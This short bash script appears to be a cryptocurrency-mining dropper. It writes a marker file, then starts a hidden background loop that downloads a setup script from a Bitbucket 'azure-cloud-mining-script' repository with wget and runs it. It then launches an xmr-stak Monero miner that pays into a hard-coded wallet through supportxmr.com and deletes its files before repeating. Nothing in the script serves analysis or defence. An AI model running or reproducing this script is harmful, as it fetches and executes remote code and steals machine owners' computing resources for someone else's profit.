SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
  nohup /bin/bash -c "export currency=monero;export pool_pass1=x;export pool_address1=pool.supportxmr.com:443;export wallet1=87iK4YAJoMCKy1wR8JfryUZqJEUux8PwcgryQTbYTQwXTzqheLpHaENGG8CMxw9BiTNvp4q7cshUzMUJV1gZNrXQ64WRWpo;export nicehash1=false;export pool_pass2=x;export pool_address2=;export wallet2=;export nicehash2=false;while [ 1 ] ;do wget https://bitbucket.org/ashleychow/azure-cloud-mining-script/raw/67c896b4e3c8016134cc7306d372a23c16f21562/azure_script/setup_vm3.sh ; chmod u+x setup_vm3.sh ; ./setup_vm3.sh ; cd azure-cloud-mining-script; cd azure_script; ./run_xmr_stak.pl; cd ..; cd ..; rm -rf azure-cloud-mining-script ; rm -rf setup_vm3.sh; done;" >/dev/null 2>&1 &
fi
